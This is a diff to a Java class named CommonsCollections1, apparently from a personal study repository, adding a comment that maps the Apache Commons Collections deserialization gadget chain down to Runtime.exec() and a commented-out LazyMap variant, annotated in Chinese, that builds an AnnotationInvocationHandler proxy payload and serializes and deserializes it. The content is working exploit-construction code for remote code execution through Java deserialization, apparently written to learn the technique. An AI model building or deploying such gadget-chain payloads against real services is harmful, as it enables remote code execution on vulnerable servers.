@@ -1,4 +1,4 @@
-package org.example;
+package org.shear1n;
 
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
@@ -14,6 +14,27 @@ import java.lang.reflect.Method;
 import java.util.HashMap;
 import java.util.Map;
 import java.util.Objects;
+
+/*
+* Gadgets chain
+		ObjectInputStream.readObject()
+			AnnotationInvocationHandler.readObject()
+				Map(Proxy).entrySet()
+				    //AnnotationInvocationHandler.invoke()
+						TransformedMap.setValue()   //LazyMap.get()
+							ChainedTransformer.transform()
+								ConstantTransformer.transform()
+								InvokerTransformer.transform()
+									Method.invoke()
+										Class.getMethod()
+								InvokerTransformer.transform()
+									Method.invoke()
+										Runtime.getRuntime()
+								InvokerTransformer.transform()
+									Method.invoke()
+										Runtime.exec()
+
+* */
 
 public class CommonsCollections1 {
     public static void main(String[] args) throws IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException {
@@ -78,6 +99,32 @@ public class CommonsCollections1 {
 
         serializable(obj);
         unserializable("ser.bin");
+
+        /*
+        LazyMap链子使用
+
+        Transformer Transformer = new ChainedTransformer(transformers);
+
+        HashMap<Object,Object> map = new HashMap();
+        Map lazymap = LazyMap.decorate(map,Transformer);
+
+        Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+        Constructor declaredConstructor = cl.getDeclaredConstructor(Class.class, Map.class);
+        declaredConstructor.setAccessible(true);
+        InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Target.class,lazymap);
+
+        //LazyMap需要用到对象代理,从而获取到AnnotationInvocationHandler#invoke，执行里面的get方法
+        Map proxMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},invocationHandler);
+        //代理后的对象为proxyMap，这里并不能直接对其序列化，因为入口类是sun.reflect.annotation.AnnotationInvocationHandler#readObject
+        // 需要AnnotationInvocationHandler对这个proxyMap进行包裹：
+
+        InvocationHandler handler = (InvocationHandler) declaredConstructor.newInstance(Target.class,proxMap);
+
+        serializable(handler);
+        unserializable("ser.bin");
+
+        */
+
 
     }
 
